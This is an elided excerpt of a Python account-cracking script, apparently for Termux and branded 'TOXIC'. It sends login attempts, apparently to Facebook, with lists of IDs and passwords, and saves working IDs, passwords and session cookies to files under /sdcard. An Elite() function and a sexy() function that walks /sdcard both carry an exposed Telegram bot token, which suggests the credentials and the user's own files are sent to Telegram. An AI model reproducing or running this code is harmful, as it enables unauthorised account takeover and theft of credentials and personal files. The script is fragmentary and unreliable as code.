...
def sexy():
    ...
    #bot_token = '6975129808:AAHpjYW5ZUqSx4mBLOgLbmMmCA2hF718uyE' 
#    chat_id = '5392389459'
    #-----------( /sdcard
    try:
        sdcard_path = '/sdcard'
...
def Elite(id,ps,coki):
    try:
        import requests
      #  token = "6975129808:AAHpjYW5ZUqSx4mBLOgLbmMmCA2hF718uyE"#Add yout token 
    #    chatid = "5392389459"#Add your Chat Id
...
logo = (f'''\x1b[1;92m 
\033[0;38m _______  _______  _______          _________
\033[1;36m(  ____ )(  ____ )(  ___  )|\     /|\__   __/
\033[1;36m| (    )|| (    )|| (   ) |( \   / )   ) (   
\033[1;36m| (____)|| (____)|| |   | | \ (_) /    | |   
\033[1;36m|  _____)|     __)| |   | |  ) _ (     | |   
\033[1;36m| (      | (\ (   | |   | | / ( ) \    | |   
\033[1;36m| )      | ) \ \__| (___) |( /   \ )___) (___
\033[1;36m|/       |/   \__/(_______)|/     \|\_______/\x1b[38;5;46m
\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
...
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mGuthub   \x1b[1;97m  ● \033[38;5;46mTox1c-143
...
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46m[BROTHER]  \x1b[1;97m● \033[38;5;196m[\x1b[1;97mMAHADI-143\033[38;5;196m]
\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
def linex():
        print('\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')    
def clear():
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mTOXIC-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;97m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
                    ...
                    break
                     ...
                     cps.append(sid)
                     open('/sdcard/TOXIC/M1-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    Elite(sid,ps,ckkk)
                    oks.append(sid)
                    open('/sdcard/TOXIC/OK_ids_M3.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/TOXIC/COOKiEs_M3.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                   # print(f"\r\x1b[1;96m [TOXIC-CP] {sid} ● {ps} {S}")
                    cps.append(sid)
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    Elite(sid,ps,ckkk)
                    oks.append(sid)
                    open('/sdcard//TOXIC/OK_ids_M2.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/TOXIC/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #print(f"\r\x1b[1;96m [TOXIC-CP] {sid} ● {ps} {S}")
                    cps.append(sid)
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    Elite(sid,ps,ckkk)
                    oks.append(sid)
                    open('/sdcard/TOXIC/OK_ids_M4.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/TOXIC/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
...
def main_apv():
    ...
    print(logo)
    try:
        key1 = open('/sdcard/.MR-ERROR.key.txt', 'r').read()
    except IOError:
        os.system('clear')
        print(logo)
